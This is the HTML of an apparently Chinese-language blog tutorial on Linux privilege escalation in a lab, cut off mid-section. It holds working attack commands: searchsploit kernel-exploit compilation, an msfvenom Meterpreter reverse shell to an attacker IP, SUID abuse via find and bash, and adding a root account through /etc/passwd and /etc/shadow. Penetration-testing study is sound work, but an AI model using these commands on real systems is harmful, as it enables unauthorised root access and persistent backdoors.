@@ -1,0 +1,1076 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Linux提权1.linux内核提权提权原理内核提权是利用Linux内核的漏洞进行提权的。内核漏洞进行提权一般包括三个环节：  1、对目标系统进行信息收集，获取到系统内核信息以及版本信息；  2、根据内核版本获取其对应的漏洞以及EXP；  3、使用找到的EXP对目标系统发起攻击，完成提权操作   查看Linux操作系统的内核版本和相关信息  1234cat &#x2F;etc&#x2F;issue 查看ubuntu或">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权-linux提权">
+<meta property="og:url" content="http://example.com/2024/01/10/%E6%8F%90%E6%9D%83-linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="r1ckyL&#39;s secret">
+<meta property="og:description" content="Linux提权1.linux内核提权提权原理内核提权是利用Linux内核的漏洞进行提权的。内核漏洞进行提权一般包括三个环节：  1、对目标系统进行信息收集，获取到系统内核信息以及版本信息；  2、根据内核版本获取其对应的漏洞以及EXP；  3、使用找到的EXP对目标系统发起攻击，完成提权操作   查看Linux操作系统的内核版本和相关信息  1234cat &#x2F;etc&#x2F;issue 查看ubuntu或">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20240110132524931.png">
+<meta property="og:image" content="http://example.com/img/image-20240110132600977.png">
+<meta property="og:image" content="http://example.com/img/image-20240110132613436.png">
+<meta property="og:image" content="http://example.com/img/image-20240110132743625.png">
+<meta property="og:image" content="http://example.com/img/image-20240110133358478.png">
+<meta property="og:image" content="http://example.com/img/image-20240110133552584.png">
+<meta property="og:image" content="http://example.com/img/image-20240110133442560.png">
+<meta property="og:image" content="http://example.com/img/image-20240110133522227.png">
+<meta property="og:image" content="http://example.com/img/image-20240110134033077.png">
+<meta property="og:image" content="http://example.com/img/image-20240110133529493.png">
+<meta property="og:image" content="http://example.com/img/image-20240110134325519.png">
+<meta property="og:image" content="http://example.com/img/image-20240110135339662.png">
+<meta property="og:image" content="http://example.com/img/image-20240110135533443.png">
+<meta property="og:image" content="http://example.com/img/image-20240110140435160.png">
+<meta property="og:image" content="http://example.com/img/image-20240110140717161.png">
+<meta property="og:image" content="http://example.com/img/image-20240110140845682.png">
+<meta property="og:image" content="http://example.com/img/image-20240110141039600.png">
+<meta property="og:image" content="http://example.com/img/image-20240110141119517.png">
+<meta property="og:image" content="http://example.com/img/image-20240110141243083.png">
+<meta property="og:image" content="http://example.com/img/image-20240110141537071.png">
+<meta property="og:image" content="http://example.com/img/image-20240110141814041.png">
+<meta property="og:image" content="http://example.com/img/image-20240110142055699.png">
+<meta property="og:image" content="http://example.com/img/image-20240110142448286.png">
+<meta property="og:image" content="http://example.com/img/image-20240110144808035.png">
+<meta property="og:image" content="http://example.com/img/image-20240110150757454.png">
+<meta property="og:image" content="http://example.com/img/image-20240110152219692.png">
+<meta property="og:image" content="http://example.com/img/image-20240110152243783.png">
+<meta property="og:image" content="http://example.com/img/image-20240110152438332.png">
+<meta property="og:image" content="http://example.com/img/image-20240110154741151.png">
+<meta property="og:image" content="http://example.com/img/image-20240110154836819.png">
+<meta property="og:image" content="http://example.com/img/image-20240110154858676.png">
+<meta property="og:image" content="http://example.com/img/image-20240110155004695.png">
+<meta property="og:image" content="http://example.com/img/image-20240110155207149.png">
+<meta property="og:image" content="http://example.com/img/image-20240110160653508.png">
+<meta property="og:image" content="http://example.com/img/image-20240110161406810.png">
+<meta property="og:image" content="http://example.com/img/image-20240110161418339.png">
+<meta property="og:image" content="http://example.com/img/image-20240110161440765.png">
+<meta property="og:image" content="http://example.com/img/image-20240110161459732.png">
+<meta property="og:image" content="http://example.com/img/image-20240110161513977.png">
+<meta property="og:image" content="http://example.com/img/image-20240110161616276.png">
+<meta property="og:image" content="http://example.com/img/image-20240110163945848.png">
+<meta property="og:image" content="http://example.com/img/image-20240110164420634.png">
+<meta property="og:image" content="http://example.com/img/image-20240110164952287.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165127162.png">
+<meta property="og:image" content="http://example.com/img/image-20240110164914528.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165026211.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165137653.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165406805.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165422191.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165436692.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165448140.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165532144.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165546432.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165610462.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165746740.png">
+<meta property="og:image" content="http://example.com/img/image-20240110165814958.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170320323.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170423586.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170459127.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170600574.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170636346.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170656754.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170712146.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170752699.png">
+<meta property="og:image" content="http://example.com/img/image-20240110170816097.png">
+<meta property="og:image" content="http://example.com/img/image-20240110171414303.png">
+<meta property="og:image" content="http://example.com/img/image-20240110171835109.png">
+<meta property="article:published_time" content="2024-01-10T09:20:43.000Z">
+<meta property="article:modified_time" content="2024-01-10T09:22:03.997Z">
+<meta property="article:author" content="r1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20240110132524931.png">
+  
+  
+  
+  <title>提权-linux提权 - r1ckyL&#39;s secret</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r1ckyL</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="提权-linux提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-10 17:20" pubdate>
+          2024年1月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          87 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">提权-linux提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="1-linux内核提权"><a href="#1-linux内核提权" class="headerlink" title="1.linux内核提权"></a>1.linux内核提权</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>内核提权是利用Linux内核的漏洞进行提权的。内核漏洞进行提权一般包括三个环节： </p>
+<p>1、对目标系统进行信息收集，获取到系统内核信息以及版本信息； </p>
+<p>2、根据内核版本获取其对应的漏洞以及EXP； </p>
+<p>3、使用找到的EXP对目标系统发起攻击，完成提权操作 </p>
+<ul>
+<li>查看Linux操作系统的内核版本和相关信息</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/issue 查看ubuntu或者centos的版本<br><span class="hljs-built_in">cat</span> /etc/*-release 查看centos版本<br><span class="hljs-built_in">uname</span> -a 查看系统全部信息<br><span class="hljs-built_in">uname</span> -r 查看内核版本<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110132524931.png" srcset="/img/loading.gif" lazyload alt="image-20240110132524931"></p>
+<p>EXP可以用kali去寻找，kali中自带searchsploit命令可以查找EXP</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchspolit linux xxx</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110132600977.png" srcset="/img/loading.gif" lazyload alt="image-20240110132600977"> </p>
+<p><img src="/img/image-20240110132613436.png" srcset="/img/loading.gif" lazyload alt="image-20240110132613436"></p>
+<p>复制利用脚本到当前目录</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -m <span class="hljs-number">42887</span>.c<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110132743625.png" srcset="/img/loading.gif" lazyload alt="image-20240110132743625"></p>
+<p>去互联网搜索该脚本的用法和相关的文档</p>
+<h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>环境：本次实验使用Ubuntu 20.04,内核版本是5.10版本的</p>
+<p><img src="/img/image-20240110133358478.png" srcset="/img/loading.gif" lazyload alt="image-20240110133358478"> </p>
+<p>使用MSF上线机器</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.41.211 <span class="hljs-attribute">LPORT</span>=8888 -f<br>elf &gt; mshell.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.41.211<br><span class="hljs-built_in">set</span> lport 8888<br>run<br></code></pre></td></tr></table></figure>
+
+<p>查看权限，较低：</p>
+<img src="/img/image-20240110133552584.png" srcset="/img/loading.gif" lazyload alt="image-20240110133552584" style="zoom:67%;" /> 
+
+<p>查看操作系统</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue<br>cat <span class="hljs-regexp">/etc/</span>*-release<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20240110133442560.png" srcset="/img/loading.gif" lazyload alt="image-20240110133442560" style="zoom:67%;" /> 
+
+<p>查看可以利用的内核版本提权漏洞</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> linux <span class="hljs-number">5</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110133522227.png" srcset="/img/loading.gif" lazyload alt="image-20240110133522227"></p>
+<p>将脚本进行复制并且只用GCC进行编译，或者使用百度搜索相关的文档进行使用</p>
+<img src="/img/image-20240110134033077.png" srcset="/img/loading.gif" lazyload alt="image-20240110134033077" style="zoom: 67%;" /> 
+
+<p>使用gcc进行编译</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> -o test11 <span class="hljs-number">50808</span>.c<br></code></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/test11 /u</span>sr<span class="hljs-regexp">/bin/</span>su<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20240110133529493.png" srcset="/img/loading.gif" lazyload alt="image-20240110133529493" style="zoom:67%;" /> 
+
+
+
+<h2 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="2.SUID提权"></a>2.SUID提权</h2><h3 id="SUID介绍"><a href="#SUID介绍" class="headerlink" title="SUID介绍"></a>SUID介绍</h3><p>SUID是一种特殊权限，设置了suid的程序文件，<strong>在用户执行该程序时，用户的权限是该程序文件属主的权限</strong>，例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。sgid与suid 类似，只是执行程序时获得的是文件属组的权限。passwd这个命令程序的权限设置，它就是设置了 suid权限的</p>
+<p><img src="/img/image-20240110134325519.png" srcset="/img/loading.gif" lazyload alt="image-20240110134325519"></p>
+<p>注意以下几点： </p>
+<p>1.只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</p>
+<p>2.命令执行者要对该程序文件拥有执行(x)权限.</p>
+<p>3.命令执行者在执行该程序时获得该程序文件属主的身份.</p>
+<p>4.SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</p>
+<h3 id="设置SUID"><a href="#设置SUID" class="headerlink" title="设置SUID"></a>设置SUID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename 设置SUID位<br><span class="hljs-built_in">chmod</span> u-s filename 去掉SUID设置<br></code></pre></td></tr></table></figure>
+
+<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>普通用户无法查看shadow文件</p>
+<p><img src="/img/image-20240110135339662.png" srcset="/img/loading.gif" lazyload alt="image-20240110135339662"> </p>
+<p>如果root给cat设置了suid权限，则普通用户可以使用cat查看shadow文件</p>
+<p><img src="/img/image-20240110135533443.png" srcset="/img/loading.gif" lazyload alt="image-20240110135533443"> </p>
+<h3 id="SUID提权原理"><a href="#SUID提权原理" class="headerlink" title="SUID提权原理"></a>SUID提权原理</h3><p>原理：利用某些二进制文件设置了SUID权限，从而用root权限执行系统命令</p>
+<p>常见的可以用来提权的命令如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp<br>awk<br>mv<br>更多命令查看：https:<span class="hljs-regexp">//g</span>tfobins.github.io<span class="hljs-regexp">/gtfobins/</span>awk/<span class="hljs-comment">#suid</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="查找SUID文件"><a href="#查找SUID文件" class="headerlink" title="查找SUID文件"></a>查找SUID文件</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p>一、 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null </p>
+<p>1、find 是查找文件的命令 </p>
+<p>2、&#x2F; 是从根目录开始查找 </p>
+<p>3、-user root 是文件的所属者是root </p>
+<p>4、-perm -4000</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-perm匹配权限</span><br>4000 2000 1000分别表示SUID SGID SBIT<br>1.普通文件，文件的权限一般三位，777最高文件权限<br><span class="hljs-deletion">-perm -0777搜索的就是最高权限的文件rwxrwxrwx</span><br><span class="hljs-deletion">-perm +0777搜索的只要包含rwxrwxrwx任意一个的文件</span><br>2.特殊文件，包含权限位置四位，7000为最高，即–s–s–t，同样的方法<br><span class="hljs-deletion">-perm -7000搜索的就是最高权限的文件–s–s–t</span><br><span class="hljs-deletion">-perm +7000搜索的只要包含–s–s–t任意一个的文件，–s — —（4000）、— –s —（2000）、— — –t（1000）等</span><br></code></pre></td></tr></table></figure>
+
+<p>5、-print 2&gt;&#x2F;dev&#x2F;null 将标准错误输入到&#x2F;dev&#x2F;null文件</p>
+<p><img src="/img/image-20240110140435160.png" srcset="/img/loading.gif" lazyload alt="image-20240110140435160"> </p>
+<p>二、 find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>1、find 是查找文件的命令 </p>
+<p>2、&#x2F; 是从根目录开始查找 </p>
+<p>3、-perm -u&#x3D;s 查找有s权限 </p>
+<p>4、 -type f -type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 查是块设备、目录、字符设备、管道、符号链接、普通文件</p>
+<p>三、 find &#x2F; -user root -perm -4000 -exec ls -ldb {};</p>
+<p>1、find 是查找文件的命令 </p>
+<p>2、&#x2F; 是从根目录开始查找 </p>
+<p>3、-user root 是文件的所属者是root </p>
+<p>4、-perm -4000 5、-exec ls -ldb {}; 执行 ls -ddb命令</p>
+<h3 id="提取介绍"><a href="#提取介绍" class="headerlink" title="提取介绍"></a>提取介绍</h3><h4 id="FIND提权"><a href="#FIND提权" class="headerlink" title="FIND提权"></a>FIND提权</h4><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用 SUID权限运行，则可以通过find执行的命令都将以root身份去运行</p>
+<p>步骤 </p>
+<p>1、查找SUID文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110140717161.png" srcset="/img/loading.gif" lazyload alt="image-20240110140717161"> </p>
+<p>2、利用find提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#必须要有这个文件</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110140845682.png" srcset="/img/loading.gif" lazyload alt="image-20240110140845682"> </p>
+<h4 id="BASH提权"><a href="#BASH提权" class="headerlink" title="BASH提权"></a>BASH提权</h4><p>bash命令是用来打开一个shell。同时它也有执行命令的能力。 因此，如果配置为使用SUID权限运行， 则可以通过bash执行的命令都将以root身份去运行</p>
+<p>1、查找SUID文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110141039600.png" srcset="/img/loading.gif" lazyload alt="image-20240110141039600"> </p>
+<p>2、利用bash提权</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">bash -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110141119517.png" srcset="/img/loading.gif" lazyload alt="image-20240110141119517"> </p>
+<h4 id="VIM提权"><a href="#VIM提权" class="headerlink" title="VIM提权"></a>VIM提权</h4><p>利用vim提权的思路是<strong>修改&#x2F;etc&#x2F;passwd文件和&#x2F;etc&#x2F;shadow，为自己添加一个有root权限的用户</strong></p>
+<p>1、查找SUID文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110141243083.png" srcset="/img/loading.gif" lazyload alt="image-20240110141243083"> </p>
+<p>2、利用vim提权 </p>
+<p>第一种方式，利用vim添加账号</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">vim /etc/passwd 添加特权用户<br>添加：<span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/bob</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110141537071.png" srcset="/img/loading.gif" lazyload alt="image-20240110141537071"> </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>shadow 添加特权用户<br>test:<span class="hljs-variable">$6</span><span class="hljs-variable">$0OqvyYYBMtX8HD3n</span><span class="hljs-variable">$GIzRaq</span><span class="hljs-regexp">/IAtpWZQXTc4G1tNCkjjFq29hKtyf9pJhiREQcOwNDWRgJeyebJMmYPfLSxLJ9JMh53jru02TH8/</span>WFN0::<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110141814041.png" srcset="/img/loading.gif" lazyload alt="image-20240110141814041"></p>
+<p>直接登录test账号</p>
+<p><img src="/img/image-20240110142055699.png" srcset="/img/loading.gif" lazyload alt="image-20240110142055699"> </p>
+<p>第二种，利用vim打开交互shell</p>
